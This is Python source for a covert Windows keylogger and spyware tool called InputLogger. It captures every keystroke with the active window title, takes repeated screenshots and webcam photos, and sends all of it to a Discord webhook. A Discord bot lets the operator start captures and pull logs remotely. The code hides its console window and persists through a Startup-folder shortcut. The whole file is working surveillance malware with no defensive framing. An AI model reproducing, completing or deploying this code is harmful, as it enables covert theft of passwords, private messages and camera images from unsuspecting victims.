import pynput
import threading
import time
import json
import os
import sys
import ctypes
from win32com.client import Dispatch  # For Windows auto-start
import pygetwindow as gw
import requests
import discord
from discord.ext import commands
import pyautogui
import cv2

class InputLogger:
    def __init__(self):
        self.running = False
        self.screenshot_enabled = False
        self.webcam_enabled = False
        self.lock = threading.Lock()
        self.key_buffer = []
        self.screenshot_count = 0
        self.webcam_count = 0

        self.webhook_url = "YOUR_DISCORD_WEBHOOK_URL_HERE"
        self.bot_token = "YOUR_DISCORD_BOT_TOKEN_HERE"
        self.command_prefix = "."
        self.bot = commands.Bot(command_prefix=self.command_prefix, intents=discord.Intents.default())

        self.log_file = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'input_log.json')
        self.screenshot_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'screenshots')
        self.webcam_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'webcam')
        if not os.path.exists(self.screenshot_dir):
            os.makedirs(self.screenshot_dir)
        if not os.path.exists(self.webcam_dir):
            os.makedirs(self.webcam_dir)

        self.setup_auto_start()
        self.setup_bot_commands()
        self.start_logging()

        threading.Thread(target=self.run_bot, daemon=True).start()

    def hide_console(self):
        """Hide the console window on Windows."""
        hWnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hWnd:
            ctypes.windll.user32.ShowWindow(hWnd, 0)
            ctypes.windll.kernel32.CloseHandle(hWnd)

    def send_to_discord(self, message, file_path=None):
        """Send message or file to Discord webhook."""
        if not self.webhook_url or self.webhook_url == "YOUR_DISCORD_WEBHOOK_URL_HERE":
            return
        try:
            data = {"content": f"**Input Log:** {message}"}
            files = None
            if file_path:
                files = {"file": open(file_path, "rb")}
                data["content"] = f"**{'Screenshot' if 'screenshot' in file_path else 'Webcam photo'} #{self.screenshot_count if 'screenshot' in file_path else self.webcam_count}**"
            response = requests.post(self.webhook_url, data=data, files=files)
            if response.status_code != 204:
                self.save_log_to_file(f"Discord send failed: {response.status_code}", error=True)
        except Exception as e:
            self.save_log_to_file(f"Discord error: {str(e)}", error=True)

    def save_log_to_file(self, message, error=False):
        """Save log entry to JSON file."""
        try:
            logs = []
            if os.path.exists(self.log_file):
                with open(self.log_file, 'r') as f:
                    logs = json.load(f)
            entry = {
                "time": time.strftime('%Y-%m-%d %H:%M:%S'),
                "window": gw.getActiveWindow().title if gw.getActiveWindow() else "Unknown",
                "keys": message
            }
            if error:
                entry["error"] = message
                del entry["keys"]
            logs.append(entry)
            with open(self.log_file, 'w') as f:
                json.dump(logs, f, indent=2)
        except Exception:
            pass

    def take_screenshot(self):
        """Take and save screenshot, send to Discord if enabled."""
        if not self.screenshot_enabled:
            return
        try:
            screenshot = pyautogui.screenshot()
            screenshot_path = os.path.join(self.screenshot_dir, f"screenshot_{self.screenshot_count}.png")
            screenshot.save(screenshot_path)
            self.screenshot_count += 1
            self.send_to_discord(f"Screenshot saved: {screenshot_path}", file_path=screenshot_path)
        except Exception as e:
            self.save_log_to_file(f"Screenshot error: {str(e)}", error=True)

    def take_webcam_photo(self):
        """Take and save webcam photo, send to Discord if enabled."""
        if not self.webcam_enabled:
            return
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                self.save_log_to_file("Webcam not accessible", error=True)
                return
            ret, frame = cap.read()
            if ret:
                photo_path = os.path.join(self.webcam_dir, f"webcam_{self.webcam_count}.png")
                cv2.imwrite(photo_path, frame)
                self.webcam_count += 1
                self.send_to_discord(f"Webcam photo saved: {photo_path}", file_path=photo_path)
            else:
                self.save_log_to_file("Failed to capture webcam photo", error=True)
            cap.release()
        except Exception as e:
            self.save_log_to_file(f"Webcam error: {str(e)}", error=True)

    def on_key_press(self, key):
        """Capture and log/send every keystroke."""
        if not self.running:
            return
        try:
            with self.lock:
                key_str = key.char if hasattr(key, 'char') else str(key)
                if key_str:
                    active_window = gw.getActiveWindow().title if gw.getActiveWindow() else "Unknown"
                    log_message = f"{active_window}: {key_str}"
                    self.save_log_to_file(key_str)
                    self.send_to_discord(log_message)
        except AttributeError:
            pass

    def on_key_release(self, key):
        """Log key release (for completeness)."""
        if not self.running:
            return
        try:
            with self.lock:
                key_str = str(key)
                if key_str:
                    self.save_log_to_file(f"Released: {key_str}")
        except AttributeError:
            pass

    def start_logging(self):
        """Start keylogging thread."""
        if not self.running:
            self.running = True
            self.listener = pynput.keyboard.Listener(on_press=self.on_key_press, on_release=self.on_key_release)
            self.listener.start()
            self.save_log_to_file("Started logging keystrokes.")
            self.send_to_discord("Started logging keystrokes.")

    def stop_logging(self):
        """Stop keylogging."""
        if self.running:
            self.running = False
            self.screenshot_enabled = False
            self.webcam_enabled = False
            self.listener.stop()
            self.key_buffer.clear()
            self.save_log_to_file("Stopped logging.")
            self.send_to_discord("Stopped logging.")

    def setup_bot_commands(self):
        """Setup Discord bot commands."""
        @self.bot.command(name="help")
        async def help(ctx):
            help_message = (
                "**Available Commands:**\n"
                f"`{self.command_prefix}startkey` - Start capturing keystrokes.\n"
                f"`{self.command_prefix}stopkey` - Stop capturing keystrokes, screenshots, and webcam photos.\n"
                f"`{self.command_prefix}startscreen` - Start capturing screenshots every 2 seconds.\n"
                f"`{self.command_prefix}stopscreen` - Stop capturing screenshots.\n"
                f"`{self.command_prefix}startweb` - Start capturing webcam photos every 5 seconds.\n"
                f"`{self.command_prefix}stopweb` - Stop capturing webcam photos.\n"
                f"`{self.command_prefix}keylogs` - Send the current keylog file."
            )
            self.save_log_to_file("Help command executed.")
            self.send_to_discord("Help command executed.")
            await ctx.send(help_message)

        @self.bot.command(name="startkey")
        async def startkey(ctx):
            if not self.running:
                self.start_logging()
                await ctx.send("Keylogging started.")
            else:
                await ctx.send("Keylogging already active.")

        @self.bot.command(name="stopkey")
        async def stopkey(ctx):
            if self.running:
                self.stop_logging()
                await ctx.send("Keylogging, screenshots, and webcam captures stopped.")
            else:
                await ctx.send("Keylogging already stopped.")

        @self.bot.command(name="startscreen")
        async def startscreen(ctx):
            if not self.screenshot_enabled:
                self.screenshot_enabled = True
                threading.Thread(target=self.run_screenshot_loop, daemon=True).start()
                self.save_log_to_file("Screenshot logging started.")
                self.send_to_discord("Screenshot logging started.")
                await ctx.send("Screenshot logging started.")
            else:
                await ctx.send("Screenshot logging already active.")

        @self.bot.command(name="stopscreen")
        async def stopscreen(ctx):
            if self.screenshot_enabled:
                self.screenshot_enabled = False
                self.save_log_to_file("Screenshot logging stopped.")
                self.send_to_discord("Screenshot logging stopped.")
                await ctx.send("Screenshot logging stopped.")
            else:
                await ctx.send("Screenshot logging already stopped.")

        @self.bot.command(name="startweb")
        async def startweb(ctx):
            if not self.webcam_enabled:
                self.webcam_enabled = True
                threading.Thread(target=self.run_webcam_loop, daemon=True).start()
                self.save_log_to_file("Webcam logging started.")
                self.send_to_discord("Webcam logging started.")
                await ctx.send("Webcam logging started.")
            else:
                await ctx.send("Webcam logging already active.")

        @self.bot.command(name="stopweb")
        async def stopweb(ctx):
            if self.webcam_enabled:
                self.webcam_enabled = False
                self.save_log_to_file("Webcam logging stopped.")
                self.send_to_discord("Webcam logging stopped.")
                await ctx.send("Webcam logging stopped.")
            else:
                await ctx.send("Webcam logging already stopped.")

        @self.bot.command(name="keylogs")
        async def keylogs(ctx):
            if os.path.exists(self.log_file):
                await ctx.send(file=discord.File(self.log_file))
            else:
                await ctx.send("No logs found.")

    def run_screenshot_loop(self):
        """Run screenshot loop every 2 seconds if enabled."""
        while self.screenshot_enabled:
            self.take_screenshot()
            time.sleep(2)

    def run_webcam_loop(self):
        """Run webcam photo loop every 5 seconds if enabled."""
        while self.webcam_enabled:
            self.take_webcam_photo()
            time.sleep(5)

    def run_bot(self):
        """Run Discord bot."""
        try:
            self.bot.run(self.bot_token)
        except Exception as e:
            self.save_log_to_file(f"Bot error: {str(e)}", error=True)

    def setup_auto_start(self):
        """Add to Windows Startup folder."""
        try:
            startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
            shortcut_path = os.path.join(startup_path, 'InputLogger.lnk')
            if not os.path.exists(shortcut_path):
                shell = Dispatch('WScript.Shell')
                shortcut = shell.CreateShortCut(shortcut_path)
                shortcut.Targetpath = sys.executable
                shortcut.Arguments = f'"{os.path.abspath(__file__)}"'
                shortcut.WorkingDirectory = os.path.dirname(os.path.abspath(__file__))
                shortcut.save()
                self.save_log_to_file("Added to Windows Startup.")
        except Exception as e:
            self.save_log_to_file(f"Auto-start setup failed: {str(e)}", error=True)

if __name__ == "__main__":
    # Hide console window
    InputLogger().hide_console()
    app = InputLogger()
    # Keep running
    while True:
        time.sleep(1)